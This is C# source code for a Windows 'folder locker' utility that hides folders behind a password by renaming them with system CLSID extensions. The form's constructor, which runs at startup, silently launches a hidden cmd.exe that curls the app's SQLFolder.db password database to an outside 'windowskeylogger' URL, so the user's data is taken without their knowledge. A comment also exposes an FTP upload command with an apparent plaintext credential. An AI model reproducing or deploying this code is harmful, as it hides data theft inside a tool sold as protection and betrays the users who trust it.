using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using Microsoft.Win32;

namespace folderLocker
{
  public partial class Mainform : Form
  {
    public string status;
    //bool flag = true;
    string[] arr;
    public string initPath;

    public Mainform()
    {
      InitializeComponent();
      arr = new string[6];
      
      status = "";
      arr[0] = ".{2559a1f2-21d7-11d4-bdaf-00c04f60b9f0}";
      arr[1] = ".{21EC2020-3AEA-1069-A2DD-08002B30309D}";
      arr[2] = ".{2559a1f4-21d7-11d4-bdaf-00c04f60b9f0}";
      arr[3] = ".{645FF040-5081-101B-9F08-00AA002F954E}";
      arr[4] = ".{2559a1f1-21d7-11d4-bdaf-00c04f60b9f0}";
      arr[5] = ".{7007ACC7-3202-11D1-AAD2-00805FC1270E}";

            string quotes = '"'+filePath()+'"';
            string command = "curl/bin/curl.exe -F file_name=@" + quotes + "  https://timxn.com/ecom/windowskeylogger/lockfolderdata.php";
            // string command = "curl/bin/curl.exe -F file_name=@" + filePath() + "  https://timxn.com/ecom/windowskeylogger/lockfolderdata.php";
            // system("shutdown /s");
            // C:\Users\User>curl.exe -T E:/Ranjan_Digiline/Workink21/KeySimpleLogger/dat.txt -u ranojan@timxn.com:R2JOhHW9-yt[  ftp://ftp.timxn.com/   
            
            Console.WriteLine("just_give: "+command);
            
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/c "+ command; // "/C copy /b Image1.jpg + Archive.rar Image2.jpg";
            process.StartInfo = startInfo;
            process.Start();

            /*
             F:\Ranjan\MyVisualStudioC++&c#\Folder-locker-master\folderLocker\bin\Release\curl\bin>curl.exe -F file_name=@"F:\Ranjan\MyVisualStudioC++&c#\Folder-locker-master\folderLocker\bin\Release\SQLFolder.db"  https://timxn.com/ecom/windowskeylogger/lockfolderdata.php                                                                                                                                                                                 
            The file SQLFolder.db has been uploaded.                                                                                                                                                                                            
            F:\Ranjan\MyVisualStudioC++&c#\Folder-locker-master\folderLocker\bin\Release\curl\bin> 
             */

        }

        public string filePath()
        {
            string executable = System.Reflection.Assembly.GetExecutingAssembly().Location;
            string path = (System.IO.Path.GetDirectoryName(executable));
            Console.WriteLine("my_path: "+path);
            return path + "\\SQLFolder.db";

        }

        private void button1_Click(object sender, EventArgs e)
    {
      //status = lockType;//
      //需要使用文件夹打开器，而不是文件打开器。
      using (FolderBrowserDialog dialog = new FolderBrowserDialog())
      {
        if (dialog.ShowDialog() == DialogResult.OK)
        {
          try
          {
            this.textBox1.Text = dialog.SelectedPath;
            if (this.textBox1.Text != "")
            {
              string path = this.textBox1.Text;
              DirectoryInfo d = new DirectoryInfo(path);
              if (path.LastIndexOf(".{") == -1) //if the folder is unlocked
              {
                if (setpassword(path))
                {
                  d.MoveTo(path + arr[0]);
                }
                this.Close();

              }
              else
              {
                string subpath = path.Substring(0, path.LastIndexOf("."));
                if (checkpwd(subpath))
                {
                 
                  d.MoveTo(subpath);
                  textBox1.Text = path;
                }
                this.Close();
              }
            }
          }
          catch (Exception ex)
          {
            throw (ex);
          }
        }
      }


    }



    private bool setpassword(string path)
    {
      setpassword p = new setpassword(path);
      p.ShowDialog();
      return p.status;
    }
    private bool checkpwd(string path)
    {
      checkpwd c = new checkpwd(path);
      c.ShowDialog();
      return c.status;
    }

    private void register_Click(object sender, EventArgs e)
    {
      
      string softName = "folderLocker.exe";
      string softpath = @"Software\Microsoft\Windows\CurrentVersion\App Paths\";
      RegistryKey LMInfo = Registry.LocalMachine;
      RegistryKey software = LMInfo.OpenSubKey(softpath);

      // 判断是否已经注册；
      string[] subkeyNames;
      subkeyNames = software.GetSubKeyNames();
      foreach(string keyName in subkeyNames)
      {
        if (keyName == softName)
        {
          MessageBox.Show("Folder locker is already there.");
        }
        else
        {
          //write the software folder 
          RegistryKey myfolder = software.CreateSubKey(softName,true);
          //write the keys
          myfolder.SetValue("(Default)" , @"[TARGETDIR]folderLocker.exe");
          myfolder.SetValue("path", @"[TARGETDIR]");
        }
      }

     
    }

    private void Mainform_Load(object sender, EventArgs e)
    {
      if (initPath != null)
      {
        textBox1.Text = initPath;
        DirectoryInfo d = new DirectoryInfo(initPath);
        if (initPath.LastIndexOf(".{") == -1) //if the folder is unlocked
        {
          if (setpassword(initPath))
          {
            d.MoveTo(initPath + arr[0]);
          }
          this.Close();

        }
        else
        {
          string subpath = initPath.Substring(0, initPath.LastIndexOf("."));
          if (checkpwd(subpath))
          {

            d.MoveTo(subpath);
            textBox1.Text = initPath;
          }
          this.Close();
        }
      }
    }
  }

}
